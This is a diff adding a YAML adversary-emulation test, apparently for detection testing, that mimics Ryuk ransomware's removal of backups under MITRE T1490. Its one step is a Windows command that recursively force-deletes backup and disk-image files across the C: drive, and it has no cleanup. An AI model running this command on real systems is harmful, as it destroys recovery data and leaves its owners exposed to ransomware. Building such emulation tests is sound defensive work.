@@ -1,0 +1,22 @@
+api_version: "2.0"
+name: Windows - Delete Backup Files
+description: |
+    Deletes backup files in a manner similar to Ryuk ransomware. Upon exection, many "access is denied" messages will appear as the commands try
+    to delete files from around the system.
+uuid: 6b1dbaf6-cc8a-4ea6-891f-6058569653bf
+mitre:
+    tactics:
+        - 'TA0040: Impact'
+    techniques:
+        - 'T1490: Inhibit System Recovery'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: windows---delete-backup-files
+      inline: |
+        del /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.* c:\backup*.* c:\*.set c:\*.win c:\*.dsk
+      executor: command_prompt
+      cleanup:
+        inline: ""
+        executor: command_prompt
